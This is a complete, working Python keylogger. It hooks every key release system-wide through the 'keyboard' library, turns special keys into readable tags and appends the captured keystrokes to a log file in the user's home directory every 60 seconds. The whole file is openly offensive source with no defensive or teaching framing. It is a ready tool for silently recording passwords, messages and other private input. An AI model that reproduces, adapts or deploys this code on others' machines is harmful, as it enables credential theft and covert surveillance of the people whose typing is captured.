import keyboard
import datetime
from threading import Timer
import os
import sys

# Configuration
LOG_FILE = os.path.expanduser("~/keystrokes.log")  # Saves in user's home directory
INTERVAL = 60  # Time interval (seconds) to report
MAX_LOG_SIZE = 10000  # Max characters before forcing a write


class Keylogger:
    def __init__(self):
        self.log = ""
        self.start_dt = datetime.datetime.now()
        self.last_write = datetime.datetime.now()

    def callback(self, event):
        """This callback is invoked whenever a keyboard event occurs"""
        try:
            name = event.name

            # Handle special keys
            if len(name) > 1:
                if name == "space":
                    name = " "
                elif name == "enter":
                    name = "[ENTER]\n"
                elif name == "decimal":
                    name = "."
                else:
                    name = f"[{name.upper()}]"

            self.log += name

            # Force write if log gets too large
            if len(self.log) > MAX_LOG_SIZE:
                self._write_to_file()

        except Exception as e:
            self._log_error(f"Callback error: {str(e)}")

    def _write_to_file(self):
        """Write the current log to file"""
        try:
            if self.log:
                with open(LOG_FILE, "a", encoding='utf-8') as f:
                    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    f.write(f"{timestamp}:\n{self.log}\n\n")
                self.last_write = datetime.datetime.now()
                self.log = ""
        except Exception as e:
            self._log_error(f"Write error: {str(e)}")

    def _log_error(self, message):
        """Log errors to a separate file"""
        try:
            with open(os.path.expanduser("~/keylogger_errors.log"), "a") as f:
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"{timestamp} - {message}\n")
        except:
            pass  # If we can't even log the error

    def report(self):
        """Save keystrokes to file at regular intervals"""
        try:
            self._write_to_file()

            # Reset timer
            timer = Timer(interval=INTERVAL, function=self.report)
            timer.daemon = True
            timer.start()
        except Exception as e:
            self._log_error(f"Report error: {str(e)}")
            sys.exit(1)

    def start(self):
        try:
            # Record start time
            self.start_dt = datetime.datetime.now()
            self._log_error("Keylogger started")

            # Start the keylogger
            keyboard.on_release(callback=self.callback)

            # Start reporting
            self.report()

            # Block current thread
            keyboard.wait()
        except Exception as e:
            self._log_error(f"Start error: {str(e)}")
            sys.exit(1)


if __name__ == "__main__":
    print(f"Keylogger started. Keystrokes will be saved to {LOG_FILE} every {INTERVAL} seconds.")


    try:
        keylogger = Keylogger()
        keylogger.start()
    except KeyboardInterrupt:
        print("\nKeylogger stopped.")
        keylogger._write_to_file()  # Save any remaining keystrokes
    except Exception as e:
        print(f"Fatal error: {e}")
